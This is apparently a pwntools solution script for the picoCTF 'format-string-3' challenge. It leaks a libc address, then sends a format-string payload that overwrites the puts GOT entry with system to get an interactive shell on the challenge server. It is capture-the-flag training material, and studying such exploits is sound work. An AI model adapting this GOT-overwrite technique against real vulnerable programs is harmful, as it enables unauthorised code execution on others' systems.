#!/usr/bin/env python3

from pwn import *

exe = ELF("./format-string-3")
libc = ELF("./libc.so.6")
ld = ELF("./ld-linux-x86-64.so.2")

context.binary = exe


def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.DEBUG:
            gdb.attach(r)
    else:
        r = remote("rhea.picoctf.net", 60335)

    return r


def main():
    offset = 38

    r = conn()

    r.recvuntil('libc: ')
    setvbuf_leak = r.recvline().strip(b'.\n')
    setvbuf = int(setvbuf_leak, 16)
    libc.address = setvbuf - libc.sym.setvbuf
    log.info("libc, %#x", libc.address)

    payload = fmtstr_payload(offset, {exe.got.puts: libc.sym.system})

    r.sendline(payload)

    r.interactive()


if __name__ == "__main__":
    main()
